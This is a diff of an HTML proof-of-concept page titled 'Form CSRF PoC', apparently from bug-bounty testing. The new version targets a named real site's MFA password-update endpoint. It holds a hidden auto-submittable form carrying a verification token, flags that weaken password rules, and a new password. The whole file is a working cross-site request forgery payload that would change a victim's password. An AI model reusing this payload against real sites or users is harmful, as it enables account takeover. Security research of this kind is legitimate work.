@@ -2,10 +2,14 @@
 <html lang="en">
 	<body>
 		<h1>Form CSRF PoC</h1>
-		<form method="GET" action="https://www.apartments.com/loginpopup/getloginpopup/">
-			<input type="hidden" name="ViewName" value="HomePage">
+		<form method="POST" action="https://auth.apartments.com/mfa/update-password?signin=5fefe84a75841f148536bbc15d290026">
+			<input type="hidden" name="__RequestVerificationToken" value="mRN0Vxh31E4cb0WgO2LsMlIcGVpKdDU8tpmw0LWcS7F9OSXu_qldkbXTkGdu7wVgxT9z88xQy9s6BrEOF7NNm9rm2BiWUDda06ZYOcSQ2tY1">
+			<input type="hidden" name="RequiresSecurityCompliantPassword" value="False">
+			<input type="hidden" name="MinDistinctCharacterCategories" value="0">
+			<input type="hidden" name="MinPasswordLength" value="8">
+			<input type="hidden" name="NewPassword" value="bug2005e">
+			<input type="hidden" name="NewPasswordConfirm" value="bug2005e">
 			<input type="submit" value="Submit Request">
 		</form>
 	</body>
 </html>
-
